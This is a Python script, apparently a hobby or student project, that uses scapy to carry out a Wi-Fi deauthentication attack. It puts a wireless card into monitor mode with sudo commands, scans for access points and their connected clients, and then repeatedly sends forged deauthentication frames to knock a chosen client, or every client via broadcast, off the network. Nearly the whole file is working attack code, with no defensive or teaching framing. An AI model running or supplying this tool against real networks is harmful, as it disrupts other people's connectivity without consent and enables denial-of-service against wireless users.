
import sys
from scapy.all import *
from scapy.layers.dot11 import Dot11Beacon, Dot11ProbeResp, Dot11Elt, Dot11, RadioTap, Dot11Deauth
import os


# A list of anyone that is connected to the WIFI
wifi_list = {}
wifi_address = []
# For keeping all the wifi names
scannedNames = {}

# Keeping all the MAC address
scannedMac = {}

# MAc address to attack our target
target = ""


#Adding new MAC adress to the list
def filter_packets(packet):
    global scannedMac   
    if packet.type == 0 and packet.subtype == 8:
        if packet.addr2 not in scannedMac:
            scannedMac[packet.addr2] = packet.addr2
            scannedNames[packet.addr2] = packet.info
            print(len(scannedMac), '     %s     %s ' % (packet.addr2, packet.info))  
                

#Finding all the currently connected user to our target
def connected_users(packet):
    global wifi_list
    wifi_list = {}
    # addr3: Access Point MAC

    #checking the packet we cathed is the target we looked for
    if target == packet.addr3 or target == packet.addr2  and not packet.haslayer(Dot11Beacon) and not packet.haslayer(Dot11ProbeReq) and not packet.haslayer(Dot11ProbeResp):
        #checking for a new wifi coonections
        if str(packet.summary()) not in wifi_list:
            if packet.addr1 not in wifi_address and packet.addr2 != packet.addr1 and packet.addr1 != packet.addr3 and packet.addr1 != "ff:ff:ff:ff:ff:ff":
                wifi_list[str(packet.summary())] = True
                wifi_address.append(packet.addr1)
                print(len(wifi_address), '     %s          ' % (str(packet.addr1)))  
# Attack
def attack_wlan(Client_mac, A_point_mac, M_mode):
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    
    dot11 = Dot11(addr1=Client_mac, addr2=A_point_mac, addr3=A_point_mac)
    # stack them up
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    # send the packet
    sendp(packet, inter=0.1, count=100, iface=M_mode, verbose=1)

def main():
# switch to monitor mode
    global target
    global ssid_name
    os.system('iwconfig')
    networkCard = input("Enter the name of network card you want to switch to monitor mode: \n")
    os.system('sudo ifconfig ' + networkCard + ' down')
    os.system('sudo iwconfig ' + networkCard + ' mode monitor')
    os.system('sudo ifconfig ' + networkCard + ' up')
    os.system('iwconfig')
    print("Scanning for access points, please wait, press CTRL+C to stop")
    print("index         mac            bssid")
    #searching for 60 secondes
    sniff(iface=networkCard, prn=filter_packets,timeout=20)
    

    if len(scannedMac) > 0:
        mac_adder = input('Please enter the MAC address to attack: ')
        target = scannedMac[mac_adder]
        ssid_name = scannedNames[mac_adder]
        #Broadcast
        target_all_mac = "ff:ff:ff:ff:ff:ff" 

        print("target = " + str(target) + "," " ssid_name ="  + str(ssid_name))
        print("checking for clients connected to wifi, press CTRL+C to stop")
        print ("index       client mac")
        try:
            #searching for 60 secondes
            sniff(iface=networkCard, prn=connected_users,timeout=60)
        except:
            pass
        print(wifi_address)

        while(True):     
            user_adder = input(
                "Enter the MAC of the client you want to attack: \n "
                "To attack all clients enter '1' or press CTRL+C to stop \n")   
            if user_adder == '1':
                user_adder = target_all_mac    
              
            attack_wlan(user_adder, mac_adder, networkCard)     
main()    